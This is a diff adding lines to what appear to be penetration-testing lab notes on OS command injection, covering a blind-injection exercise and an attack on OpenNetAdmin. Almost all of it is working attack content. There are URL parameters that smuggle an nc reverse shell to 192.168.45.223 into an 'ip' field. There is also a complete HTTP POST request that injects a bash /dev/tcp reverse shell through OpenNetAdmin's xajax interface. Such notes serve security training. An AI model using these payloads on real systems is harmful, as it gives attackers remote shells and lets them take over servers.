@@ -114,6 +114,13 @@ http://ci-sandbox/php/blocklisted_exercise.php?ip=127.0.0.1$(id)
 
 time curl "http://ci-sandbox:80/php/blind.php?ip=10.10.10.1;sleep%2020;"
 ```
+sol Extra Mile:
+
+```
+curl "http://ci-sandbox/php/blind_exercise.php?ip=127.0.0.1;sleep%201"
+http://ci-sandbox/php/blind_exercise.php?ip=127.0.0.1;nc%20-nv%20192.168.45.223%209090%20-e%20/bin/bash
+
+```
 #### Enumerating Command Injection Capabilities
 
 Linux:
@@ -394,4 +401,22 @@ Cookie: ona_context_name=DEFAULT; ONA_SESSION_ID=lu6922hseikrrd8uslqvk8ito4
 
 xajax=window_submit&xajaxr=1679032323339&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2|php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.57%2F9090%200%3E%261%27%5C%22)%3B%22&xajaxargs[]=ping
 
+```
+
+```
+POST /ona/ HTTP/1.1
+Host: opennetadmin
+Content-Length: 171
+Method: POST http://opennetadmin/ona/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://opennetadmin
+Referer: http://opennetadmin/ona/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: ona_context_name=DEFAULT; ONA_SESSION_ID=1sg7jckj0o78i41fa3j2mjv3a0
+Connection: close
+
+xajax=window_submit&xajaxr=1692843727767&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;id;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.223/9090+0>%261'&xajaxargs[]=ping
 ```
